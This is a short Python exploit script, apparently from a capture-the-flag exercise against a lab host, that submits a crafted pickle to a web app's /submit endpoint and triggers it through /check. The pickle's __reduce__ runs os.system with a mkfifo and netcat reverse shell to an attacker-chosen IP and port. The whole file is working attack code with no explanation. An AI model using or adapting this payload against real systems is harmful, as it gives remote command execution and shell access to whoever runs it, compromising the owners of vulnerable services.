#!/usr/bin/env python

import cPickle
import os
import requests
import sys
from hashlib import md5

class Exploit(object):

    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, ('echo moe && ' + self.cmd,))

def main():
    if len(sys.argv) != 3:
        print("{} [ip] [port]".format(sys.argv[0]))
        sys.exit()

    ip = sys.argv[1]
    port = sys.argv[2]
    cmd = "rm /tmp/0xdf; mkfifo /tmp/0xdf; cat /tmp/0xdf | /bin/sh -i 2>&1 | nc {} {} > /tmp/0xdf".format(ip, port)
    exploit = cPickle.dumps(Exploit(cmd))

    char = exploit[:-1]
    quote = exploit[-1:]
    id_ = md5(char+quote).hexdigest()

    print("[*] Filename will be: {}".format(id_))
    print("[*] Exploit:\n{}".format(exploit))
    print("[+] Sending exploit...")
    r = requests.post('http://10.10.10.70/submit', data = {'character': char, 'quote': quote})
    if r.status_code != 200:
        print("[-] Error submitting exploit to /submit")
        sys.exit()
    print("[+] Exploit successfully submitted")

    print("[+] Triggering exploit with /check, id = {}".format(id_))
    try:
        r = requests.post('http://10.10.10.70/check', data = {'id': id_}, timeout=1)
    except:
        pass

if __name__ == "__main__":
    main()
